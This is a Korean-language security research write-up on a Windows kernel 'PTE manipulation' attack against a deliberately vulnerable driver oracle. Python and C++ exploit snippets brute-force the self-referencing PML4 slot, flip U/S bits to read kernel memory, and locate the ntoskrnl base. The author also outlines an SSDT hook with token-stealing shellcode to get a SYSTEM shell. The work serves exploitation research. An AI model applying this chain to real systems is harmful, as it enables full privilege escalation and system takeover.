# PTE Manipulation Attack

PTE Manipulation Attack은 임의의 페이지 테이블 엔트리를 변경하여 시스템을 장악할 수 있는 기법입니다. 이 공격은 굉장히 기본적인 동시에 아주 많은 가능성을 내포하고 있습니다.

# Prerequisite

1. 사용자는 임의의 커널 주소에 대해 임의로 값을 **비트 단위로** 쓸 수 있다.
2. 타겟 환경이 Windows, 혹은 BSD 계열이다.
3. 만약 환경이 Linux라면, 다음 조건을 만족한다.
    1. CR3을 알 수 있다.
    2. `PAGE_OFFSET` 심볼 값을 알 수 있다.

더 좁은 공격 벡터가 있을 수 있습니다. 만약 발견하셨다면 제보해주세요. 정말 감사하게 여기겠습니다. Linux의 경우 애초에 CR3를 유출할 수 있는 경우가 별로 없을 뿐더러, KASLR로 `PAGE_OFFSET` 이 랜덤화되어 조건을 만족시키기 굉장히 어렵기 때문에 이 글에서 제대로 다루지 않습니다.

### 이외

1. 임의로 값을 읽을 수 있다면 비트 단위로 쓸 수 있지 않아도, 바이트 단위로 쓸 수 있어도 됩니다.
2. 쓰기가 실패하여 시스템이 종료될 수 있습니다. 이 경우 운영체제가 Windows라면 시도당 약 0.390625% 확률로 성공합니다. 반대로, 쓰기에 실패한다고 시스템이 종료되지 않는다면 이 공격은 100% 확률로 성공합니다. BSD 계열은 이 항목을 무시하셔도 됩니다.
3. 비파괴적 쓰기(XOR, AND, OR, ADD, SUB, …) 오라클이 있다면 비트 단위로 쓰지 않아도 됩니다.

## Self-Referencing PML4E

x86_64는 48‑비트 가상 주소 공간을 기본으로 하며, 다음과 같이 4단계로 페이지를 매핑합니다.

| 레벨 | 역할 | 인덱스 비트 |
| --- | --- | --- |
| PML4 | 최상위 512개 엔트리. 다음 레벨(PDPT) 주소 보관 | 47-39 |
| PDPT | Directory Pointer Table | 38-30 |
| PD | Page Directory Entry | 29-21 |
| PT | Page Table Entry (4 KB 페이지) | 20-12 |
| 오프셋 | 실제 페이지 내부 바이트 오프셋 | 11-0 |

64-bit 5단계(`LA57`) 확장 시 구조가 한 단계 더 늘어나지만, 원리는 동일합니다. 이 글에서는 앞으로 `LA57` 확장을 쓰지 않는다는 전제 하에 작성하겠습니다.

### Idea of Recursive Mapping

Windows, BSD 계열 OS는 PML4 테이블의 특정 엔트리를 PML4 자기 자신의 물리 주소로 설정합니다. 이 방법을 통해 해당 엔트리를 통해 PML4, PDPT, PDE, PTE 전 레벨을 가상 주소로 순회할 수 있습니다.

이를 수식으로 표현하면 다음과 같습니다.

$$
\mathrm{VA}_{PT}(i,j,k) = (\texttt{SelfSlot} \ll 39) + (i \ll 30) + (j \ll 21) + (k \ll 12)
$$

여기서 `SelfSlot`은 예컨대 Windows x64의 경우 기본값 0x1ED(493)번 슬롯입니다. Windows 10 1607 이후 무작위화(randomization)를 통해 부팅 시마다 256개 후보 중 하나가 선택됩니다.

가상 주소를 가리키는 PTE의 가상 주소를 구하는 코드를 작성하면 다음과 같습니다.

```cpp
UINT64* GetPageTableEntryPointer(PVOID v, size_t level) {
	if (level == 0 || level > 4) {
		return NULL;
	}

	UINT64* ptePointer = NULL;

	if (level == 1) { // Pt
		ptePointer = (UINT64*)(gl::RtVar::Pte::MmPteBase + (((ULONG64)v >> 9) & 0x7F'FFFF'FFF8));
	}
	else if (level == 2) { // Pd
		ptePointer = (UINT64*)(gl::RtVar::Pte::MmPdeBase + (((ULONG64)v >> 18) & 0x3FFF'FFF8));
	}
	else if (level == 3) { // Pdpt
		ptePointer = (UINT64*)(gl::RtVar::Pte::MmPdpteBase + (((ULONG64)v >> 27) & 0x1F'FFF8));
	}
	else { // level == 4, Pml4
		ptePointer = (UINT64*)gl::RtVar::Pte::MmPml4eBase + (((ULONG64)v >> 39) & 0x1FF);
	}
	
	return ptePointer;
}
```

이 코드는 주어진 주소에 대해 Level N의 페이지 테이블 엔트리를 구하는 코드입니다. 여기서 `MmNBase` 를 구하는 방법은 다음과 같습니다.

```cpp
size_t selfRefIndex = ...;
size_t base = 0xFFFF'0000'0000'0000 | (selfRefIndex << 39);
Pte::MmPteBase = base;
base |= (selfRefIndex << 30);
Pte::MmPdeBase = base;
base |= (selfRefIndex << 21);
Pte::MmPdpteBase = base;
base |= (selfRefIndex << 12);
Pte::MmPml4eBase = base;
```

Linux는 Self-Referencing PML4E를 사용하지 않습니다. 대신 physmap으로 물리 메모리와 가상 메모리를 일대일대응 시키는 방법을 씁니다. 따라서 CR3를 구하고 `PAGE_OFFSET` 을 구하여 매핑 공간에 접근하여 직접 물리 메모리를 수정하는 등의 다른 방법을 이용해야 합니다. 이 경우 조건을 만족시키기 굉장히 어렵고 이 조건을 구할 때쯤 되면 아마 커널 베이스를 구했으리라 생각되기 때문에 의미가 없어 보입니다.

## Main Idea

중요한 점은, `SelfSlot` 만 알고 있다면 페이지 테이블의 주소를 알 수 있다는 것입니다. `SelfSlot` 로 들어갈 수 있는 숫자의 경우의 수는 256가지 (256~511) 로 굉장히 적습니다. FreeBSD에서는 심지어 고정된 `SelfSlot` 으로 256을 채택하고 있습니다! ([Ref](https://github.com/freebsd/freebsd-src/blob/main/sys/amd64/include/pmap.h#L190)) 이렇게 얻어진 페이지 테이블에 대해 AAW를 수행할 수 있다면 어떻게 될까요? 그렇다면 왜 비트 단위로 수정할 수 있어야 할까요? 시나리오를 통해 확인해 보겠습니다.

# Challenge

이를 바탕으로 실제 시나리오를 작성해 보겠습니다. 다음과 같은 오라클이 존재하는 Windows (NT 커널) 시스템을 가정합니다. 공격자는 이미 유저 모드에 대한 접근 권한을 전부 획득했습니다.

```cpp
NTSTATUS VulnOracle(_In_ ORACLE_INPUT *input)
{
    // Check if the address is a kernel address and has write access
    if (IsKernelAddress((PVOID)input->Where) && !HasWriteAccess((PVOID)input->Where))
        return STATUS_ACCESS_VIOLATION;

    *(volatile ULONG64 *)input->Where ^= input->What;
    return STATUS_SUCCESS;
}
```

## 목표

우선 최종 목표는 `NT AUTHORITY\System` 권한으로 PowerShell을 실행하는 것입니다. 이 목표를 달성하기 위해서는 다음과 같은 개략적인 시나리오를 따라갈 수 있습니다.

- 임의 주소 읽기를 해금한다.
- NT 커널 베이스를 획득한다.
- 쉘을 획득한다.

이제 자세히 알아보도록 합시다.

## 시나리오

### Unlocking AAR

우선 이렇게 아무 주소나 접근 가능하다고 해도, 어디부터 접근할지 감이 안 잡힙니다. 문서에서 말한 대로 우선 `SelfSlot` 을 구하겠습니다. 256가지의 경우의 수 중 하나를 확률적으로 맞춰도 충분히 합리적이지만, `HasWriteAccess` 함수 덕분에 커널 모드 주소 쓰기에 실패한다고 해서 즉시 블루 스크린을 유발하지 않기 때문에, 256개의 `SelfSlot` 을 전수조사할 수 있습니다.

만약 쓰기 작업에 실패해서 BSOD가 유발될 경우 시도당 1/256 확률을 뚫어야 합니다. 이는 합리적인 수준이지만, 빠른 진행을 위해 `HasWriteAccess` 함수를 사용하였습니다.

```python
selfpte_idx = None
for i in range(256, 512):
    address = build_px_table_entry(i) | (0x8 * 128)
    ts = build_oracle_input(address, 0)

    try:
        _ = device.ioctl(IOCTL_ORACLE, ts)

        # Successful Operation!
        selfpte_idx = i
        break

    except OSError as e:
        if e.winerror != 998: # STATUS_ACCESS_VIOLATION
            print(f"Unexpected error: {e}")
        continue

print(f"Self PTE index found: {selfpte_idx}")

mm_pte_base = 0xFFFF000000000000 | (selfpte_idx << 39)
mm_pde_base = mm_pte_base | (selfpte_idx << 30)
mm_ppe_base = mm_pde_base | (selfpte_idx << 21)
mm_pxe_base = mm_ppe_base | (selfpte_idx << 12)
```

우선 AAR을 해금해야 하는 이유는 NT 커널 베이스를 구하는 것과 관계가 있습니다. 아무리 그래도 AAW 하나만으로 시스템을 장악할 할 수는 없어 보이기 때문입니다.

막막해 보일 수 있으나, 정말 중요한 비트가 페이지 테이블에 존재합니다. 바로 `U/S` 비트입니다.

> `U/S` 비트는 User/Supervisor 의 줄임말로, 비트 `2` 에 위치합니다. 이 비트가 꺼져 있다면 CPL이 3일 때 해당 주소에 접근할 수 없지만, 켜져 있다면 유저 모드일 경우에도 접근할 수 있습니다!
> 

비트 단위로 접근해야 하기 때문에 비트 단위의 쓰기가 필요하다고 한 것입니다.

즉, `U/S` 비트를 켠다면 유저 모드에서 해당 커널 모드 주소에 접근이 가능해지는 황당한 상황이 일어납니다! 먼저 상황을 파악하기 위해 PML4부터 확인해보도록 하겠습니다.

```python
selfpte_pte = mm_pxe_base | (selfpte_idx * 8)
ts = build_oracle_input(selfpte_pte, (1 << 2))
_ = device.ioctl(IOCTL_ORACLE, ts)
print("Self PTE U/S bit flipped successfully!")
_ = device.ioctl(IOCTL_RELOAD_CR3)
print("TLB flushed successfully!")
mm_pxe_data = read_memory(mm_pxe_base, 0x1000)
print(f"Kernel data read successfully: {mm_pxe_data[:64].hex()}...")
```

실제로 실행한 결과입니다.

```
Successfully opened device: \\.\Global\krnl
Self PTE index found: 439
Self PTE U/S bit flipped successfully!
TLB flushed successfully!
Let's read kernel memory.. (@ 0xffffdbedf6fb7000)
Kernel data read successfully: 671840690100000a67c8de650100000a00000000000000000000000000000000...
```

정말로 읽히는 것을 확인할 수 있습니다! 이로써 AAR를 해금하였습니다.

### Obtaining NT Kernel Base

이제 AAR이 가능해졌기 때문에, NT 커널 베이스를 구할 수 있습니다. 아무 정보도 없는데 어떻게 커널 베이스를 얻을 수 있을 것인가에 대한 궁금증이 들 수 있습니다. 이제부터 설명해드리겠습니다.

운영 체제들은 효율적 관리를 위해 페이지 테이블을 쓴다고 말한 적이 있습니다. 반대로 말하면, 우리 또한 페이지 테이블을 이용하여 효율적으로 안 쓰이는 메모리를 모두 건너뛸 수 있다는 말입니다.

루트 PML4 페이지부터 시작해서 트리 구조의 페이지 테이블 트리를 탐색해 나간다면 효율적으로 탐색할 수 있을 것입니다. PTE의 `P` 비트는 해당 페이지가 유효한지를 나타내는데, 이것을 활용하여 안 쓰이는 메모리를 효과적으로 판별할 수 있습니다.

더해서, 우선 NT 커널은 PD 수준의 Large Page (2MB) 에 매핑된다는 사실이 잘 알려져 있습니다. (수준이 좋지 않은 하드웨어를 사용하고 있을 경우 달라지지만, 아마 2000년대에 생산된 컴퓨터가 아니라면 모두 2MB 페이지에 매핑될 것입니다…) 즉, 가장 낮은 레벨은 PT 수준까지 내려가지 않아도 탐색을 완료할 수 있다는 말이 됩니다.

정말 어려웠던 점이 있었습니다. 이것을 단순하게 재귀적으로 탐색하여 U/S 비트를 뒤집는 경우 `UNEXPECTED_KERNEL_MODE_TRAP` BSOD가 발생하였습니다. 정확한 이유를 찾지 못했지만, 아마 SMAP 정책 때문인 것 같았습니다. (페이지가 유저 모드화 되어 접근하자마자 SMAP로 인한 `#PF` 발생) 

이로 인해 치명적이지 않은 선에서 `U/S` 비트를 뒤집어야 합니다. 하지만 정말 막막한 점은 페이지 테이블 엔트리만 본다고 그것이 어디서 사용되는지, 접근되는지, 실행되는지 알 수가 없다는 점입니다. 각 PML4E가 어떤 식으로 사용되는지 기술하는 `MiVisibleState` 전역변수가 있지만, 현재 상황에서 사용할 수는 없어보입니다.

신기한 점을 여러 번 실행하는 도중에 발견했는데, 항상 `ntoskrnl.exe` 가 특정 PML4E에 매핑되는 것 (Index 496)을 확인했습니다. 이에 대해 찾아보니, 각 메모리 리전마다 미리 정의된 사용처가 있었습니다. [Ref](https://codemachine.com/articles/x64_kernel_virtual_address_space_layout.html)

다행히도 해당 PML4E에 대한 PDPT 테이블에는 두 개의 엔트리밖에 없었습니다. (어떨 때는 3개가 매핑되는 것을 확인했습니다.)

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image.png)

두 개 중 하나는 HAL, 하나는 NT 커널 같아 보였습니다. (아닐 수도 있습니다, 그저 그렇게 예상하였습니다.)

여기서 각 PPE에 대해 PD를 보겠습니다.

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%201.png)

한 개의 PPE는 엔트리가 굉장히 많고 중구난방한 모습을 볼 수 있지만…

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%202.png)

다른 한 개의 PPE는 이상하리만치 깔끔합니다. 더하여 물리 메모리 페이지가 `0x200` 단위로 정렬된 것을 확인할 수 있는데, 이는 2MB 페이지가 연속적으로 할당되었다는 표시입니다. 즉, 저 물리 주소 `0x100400` 주소가 우리가 그토록 찾고 있는 NT 커널일 확률이 아주 높습니다.

이때 NT 커널인지 확인하기 위해 첫 페이지를 확인할 수 있습니다. ‘SMEP 및 SMAP 정책 때문에 의도치 않은 Double Fault 및 Triple Fault를 발생시킬 수 있는 것 아닌가’ 하는 의문을 품을 수 있으나, 실제로 확인해 보았는데 그렇지 않았습니다. 첫 페이지는 `R` 권한밖에 없는 페이지인데, 아마 이것과 연관이 있을 것 같습니다. 자세한 이유는 추후 밝혀내어야 할 것 같습니다.

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%203.png)

이 외에도 연속적인 2MB 페이지가 물리 주소 `0x200` 으로 정렬된 채 존재한다던가 하는 판정 벡터는 많이 존재합니다.

아무튼 실제로 확인해 보면…

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%204.png)

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%205.png)

잘 등장하는 것을 볼 수 있습니다.

황당하게도, 자세한 정보 없이 치명적인 페이지에 대한 `U/S` 비트를 뒤집지 않고, 몇십 번의 AAR 만으로도 NT 커널 베이스를 구할 수 있었던 것입니다.

<aside>
💡

제가 여러 번 테스트 해 보았는데, NT 커널은 항상 물리 주소 `0x100400` 을 가지고 있다는 사실을 볼 수 있었습니다. 하지만 이것이 모든 컴퓨터에서 공통은 아닙니다.

</aside>

전체 코드는 다음과 같습니다.

```python
selfpte_pte = mm_pxe_base | (selfpte_idx * 8)
toggle_us(selfpte_pte)
print("Toggled U/S bit successfully!")

nt_base = None

loader_ppe_addr = get_pp_table_entry(0xFFFF000000000000 | (496 << 39)) # Initial Loader Mappings..
loader_pxe_entry_addr = get_px_table_entry(0xFFFF000000000000 | (496 << 39))
toggle_us(loader_pxe_entry_addr)
loader_ppe_table = read_memory(loader_ppe_addr, 0x1000)

unknown_ppes = []
for i in range(512):
    entry = u64(loader_ppe_table[i*8:i*8+8])
    if entry & 0x1:
        print(f"PPE Entry PFN {i} ({hex(0xFFFF000000000000 | (496 << 39) | (i << 30))}): {hex(get_pfn(entry))}")
        unknown_ppes.append(i)

print(f"Unknown PPE entries: {unknown_ppes}")

for idx in unknown_ppes:
    pde_addr = get_pd_table_entry(0xFFFF000000000000 | (496 << 39) | (idx << 30))
    ppe_entry_addr = get_pp_table_entry(0xFFFF000000000000 | (496 << 39) | (idx << 30))
    toggle_us(ppe_entry_addr)
    pde_table = read_memory(pde_addr, 0x1000)
    
    for i in range(512):
        entry = u64(pde_table[i*8:i*8+8])
        if entry & 0x1:
            #print(f"PDE Entry PFN {i}, PPE-IDX {idx} ({hex(0xFFFF000000000000 | (496 << 39) | (idx << 30) | (i << 21))}): {hex(get_pfn(entry))}")
            if get_pfn(entry) == 0x100400: # Check if the PFN is the NT base
                nt_base = 0xFFFF000000000000 | (496 << 39) | (idx << 30) | (i << 21)
                break

    if nt_base:
        break

    toggle_us(ppe_entry_addr)

toggle_us(loader_pxe_entry_addr)

toggle_us(selfpte_pte) # Toggle back U/S.
```

### 이후…

이후의 과정은 이론적으로 쉽습니다. AAR, AAW, NT 커널 베이스가 모두 있으니 말이죠.

SMAP 때문에 `PsInitialSystemProcess` 의 Token을 빼오기 위해 NT 커널 PTE의 `U/S` 를 변경하는 것은 매우 위험합니다. 따라서, NT 커널 데이터에 대한 AAR이 불가합니다. 때문에 다른 접근법이 필요합니다.

- 적당한 함수를 찾아 함수에 대해 `W` 비트를 키고, 후킹을 진행한다. 이때 ‘적당한 함수’는 SSDT에 들어있는 함수 중 정말 잘 안 쓰이는 함수이면 된다.
- 패치는 일반적으로 `PsInitialSystemProcess` 에 대한 `Token` 을 현재 프로세스로 옮기는 쉘코드를 작성하면 된다. 함수가 쉘코드를 담기에 충분히 길지 않을 경우엔 후킹을 진행한다.
- 후킹을 할 경우에는, 유저 모드 버퍼를 할당한 뒤 그곳에 원하는 쉘코드를 적고 `U/S` 비트를 0으로 바꾸어서 SMAP가 작동하지 않게 만든다.
    - 웬만한 경우에서 후킹을 하는 것이 낫다. 시간이 적게 걸려 Race Condition의 가능성을 줄여 준다.
- 해당 함수를 트리거하여 원하는 코드를 커널 모드에서 실행한다.

여러 방법을 고안해 보았지만 해당 방법이 최선이였습니다. 다른 기발한 방법이 있다면 제보해 주시기 바랍니다. 정말 감사히 여기겠습니다.

이 방법은 PatchGuard를 트리거합니다. 따라서, 2분 내에 모든 작업을 수행하고 원상 복구 시켜놓아야 합니다.

원래라면 쉘까지 모두 유저 모드에서 획득하려고 했지만… 원인을 알 수 없는 블루스크린이 너무 많이 등장하고, 이 원인 불명의 오류를 해결하기 너무 힘든 관계로 추후 과제로 남겨두었습니다. 아마 제가 Python을 익스플로잇 도구로 사용한 것이 매우 큰 실책인 것 같습니다. 양해해 주시기 바랍니다.

## 결과

![image.png](PTE%20Manipulation%20Attack%202383cc7896e580cdaed8f7c26619e125/image%206.png)

성공적으로 쉘을 획득했습니다. 전체 코드는 Github에서 확인 가능합니다.

# 의미

PTE 공격은 매우 강력합니다. 비트 단위의 AAW가 충분히 주어지는 것만으로도 Full-Chain 커널 공격을 구성할 수 있기 때문입니다. 이 공격은 PTE의 Self-Referencing Slot을 구하기 매우 쉽다는 전제를 깔고 가기 때문에 이 공격을 방지하려면 Linux처럼 Self-Referencing Slot 자체를 사용하지 않아야 합니다.

이 뿐만이 아니라 잠재적 취약점을 확인할 수 있었는데, 바로 `ntoskrnl.exe` 베이스를 구하기 너무 쉽다는 점입니다. 항상 496 Index에 로딩된다는 점, 해당 PML4E 안의 PDPT에 활성화된 엔트리가 2개, 혹은 3개밖에 없다는 점, 그리고 또 각각의 PDPTE에 대해 NT 커널임을 너무 쉽게 확인할 수 있는 점, 이 세 가지가 맞물려 아무 정보 없이 몇십 번의 AAR 만으로도 NT 커널 베이스를 구할 수 있었습니다. 이에 대해서는 나중에 자세히 정리해 보겠습니다. 아마 [개인 블로그](https://blog.wane.im/)에 올라갈 것 같습니다.